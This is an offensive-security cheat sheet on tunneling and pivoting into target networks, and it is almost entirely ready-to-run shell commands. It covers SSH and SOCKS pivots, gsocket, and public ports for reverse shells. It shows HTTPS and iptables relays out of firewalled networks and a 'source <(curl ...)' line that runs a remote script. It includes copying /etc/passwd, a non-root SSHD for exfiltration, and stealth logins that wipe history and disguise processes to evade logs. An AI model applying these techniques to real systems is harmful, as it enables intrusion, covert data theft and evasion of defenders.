# 03 — Tunneling & Pivoting

> Authorized use only. All tunnels must stay within authorized scope.

---

## §ssh-tunnels — SSH local & remote forwards

**Local forward (reach remote service via your box):**
```bash
ssh -g -L31337:1.2.3.4:80 user@server.org
# connect to your localhost:31337 → 1.2.3.4:80, source IP = server.org
```

**Remote forward (expose an internal host to a server):**
```bash
ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
# anyone hitting server.org:31338 → 192.168.0.5:80 via your box
```

**Dynamic tunnel without reconnect:** press `~C` in an active ssh session, then add forwards.

---

## §socks — SOCKS proxy into target network

**SSH dynamic forward (SOCKS4/5):**
```bash
ssh -D 1080 user@server.org
# browser/tools → 127.0.0.1:1080, exit via server.org
```

**Reverse SOCKS (give others access to your network):**
```bash
ssh -g -R 1080 user@server.org
```

**gsocket SOCKS (no server needed, NAT-friendly):**
```bash
# on target's network:
gs-netcat -l -S
# on your workstation:
gs-netcat -p 1080
```

**Use any tool through the SOCKS proxy:**
```bash
# proxychains
echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
proxychains -f pc.conf -q curl ipinfo.io
proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1

# graftcp
(graftcp-local -select_proxy_mode only_socks5 &)
graftcp curl ipinfo.io
graftcp ssh root@192.168.1.1
```

---

## §raw-tcp-reverse — Get a public TCP port for reverse shells

**segfault.net (free):**
```bash
curl sf/port
echo "Public IP:PORT = $(cat /config/self/reverse_ip):$(cat /config/self/reverse_port)"
nc -vnlp $(cat /config/self/reverse_port)
```

**bore.pub (free):**
```bash
bore local 31337 --to bore.pub
```

**serveo.net (free):**
```bash
ssh -R 0:localhost:31337 tcp@serveo.net
```

**pinggy.io (60 min free):**
```bash
ssh -p 443 -R 0:localhost:31337 tcp@a.pinggy.io
```

Also: remote.moe, playit, ngrok (paid).

---

## §https-tunnel — Tunnel raw TCP over HTTPS

**Start a reverse HTTPS tunnel (pick one):**
```bash
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
# or cloudflared:
curl -fL -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod 755 cloudflared
cloudflared tunnel --url http://localhost:8080 --no-autoupdate
```

**A. STDIN/STDOUT pipe via websocket:**
```bash
# server: websocat -s 8080
# target: websocat wss://<HTTPS-URL>
```

**B. Raw TCP via gost:**
```bash
# server (websocket→socks5): gost -L mws://:8080
# workstation (forward 2222→server's 22):
gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
nc -vn 127.0.0.1 2222
# or as SOCKS exit node:
gost -L :1080 -F 'mwss://<HTTPS-URL>:443'
curl -x socks5h://0 ipinfo.io
```

---

## §iptables-bounce — Bounce traffic without userland proxy

```bash
bounceinit() {
    echo 1 >/proc/sys/net/ipv4/ip_forward
    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
    [ $# -le 0 ] && set -- "0.0.0.0/0"
    while [ $# -gt 0 ]; do
        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
        shift 1
    done
    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
}
bounce() { iptables -t nat -A PREROUTING -p tcp --dport "${1:?}" -m mark --mark 1188 -j DNAT --to ${2:?}:${3:?}; }

bounceinit                             # allow ALL source IPs
# bounceinit "1.2.3.4/16"            # or restrict sources
bounce 31337 144.76.220.20 22        # bounce :31337 → segfault ssh
bounce 31338 127.0.0.1 8080          # bounce :31338 → local 8080
```

**Use case:** reach gsocket-relay/TOR from deep inside firewalled networks.

---

## §ghost-ip — Spoof a ghost IP inside target network

Reconfigures the shell so any tool (nmap, cme, ...) uses a fake, non-existent source IP:
```bash
source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
```
Combine with Segfault ROOT servers or QEMU tunnels to land inside the target network.

---

## §nat-traversal — SSH to host behind NAT (ssh-j.com)

**On the NAT'd host:**
```bash
sshj() {
   local pw; pw=${1,,}
   [[ -z $pw ]] && { pw=$(head -c64 </dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }
   echo "To ssh here: ssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}"
   ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}
}
sshj                                 # random tunnel ID
sshj foobarblahblub                  # specific ID
```

**From anywhere:**
```bash
ssh -J foobarblahblub@ssh-j.com root@foobarblahblub
```
End-to-end encrypted; ssh-j.com cannot see content.

---

## §proxyjump — Pivot through multiple hops

```
workstation → C2 → internal-jumphost → target
```

```bash
# to target through both intermediaries:
ssh -J c2@10.25.237.119,jumpuser@192.168.5.135 target@172.16.2.121
# to just the jumphost:
ssh -J c2@10.25.237.119 jumpuser@192.168.5.135
```
End-to-end encrypted; no creds exposed to intermediaries. Also hides your source IP.

---

## §userland-sshd — SSHD as non-root (multiplex/exfil)

```bash
# on server as non-root user:
mkdir -p ~/.ssh 2>/dev/null
ssh-keygen -q -N "" -t ed25519 -f sshd_key
cat sshd_key.pub >>~/.ssh/authorized_keys
$(command -v sshd) -f /dev/null -o HostKey=$(pwd)/sshd_key -o GatewayPorts=yes -p 31337

# on client (copy sshd_key first):
ssh -D1080 -R31339:0:31339 -i sshd_key -p 31337 joe@1.2.3.4
```
Useful when system SSHD forbids forwarding or you need a quick non-root exfil dump.

---

## §stealth-login — Almost-invisible SSH + connection multiplexing

**Invisible SSH (no `w`/`who` entry, no known_hosts logging):**
```bash
ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
```

**`xssh` — full-comfort stealth PTY (colors, clean env, hidden as `[uid]`):**
```bash
xssh() {
    local ttyp="$(stty -g)"
    stty raw -echo icrnl opost
    [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
    ssh -oConnectTimeout=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking="${a:-accept-new}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [uid] script -qc 'exec -a [uid] bash -i' /dev/null"
    stty "${ttyp}"
}
# xssh user@server.org
```
Unsets `SSH_CLIENT`/`SSH_CONNECTION`, nulls all history files, and masquerades the
process as `[uid]`. Pair with `05-stealth.md` §hackshell on the remote side.

**Multiplex many shells over ONE TCP connection (ControlMaster):**
```bash
# create the master connection:
ssh -M -S .sshmux user@server.org
# further shells/commands reuse the same TCP conn — no re-auth, no new connection:
ssh -S .sshmux NONE
ssh -S .sshmux NONE ls -al
scp -o "ControlPath=.sshmux" NONE:/etc/passwd .
```
**OPSEC:** one TCP connection for many sessions = fewer connections in logs/netstat.
Combine with `xssh` to also stay out of `utmp`. No creds/keys traverse the wire after
the master is up.
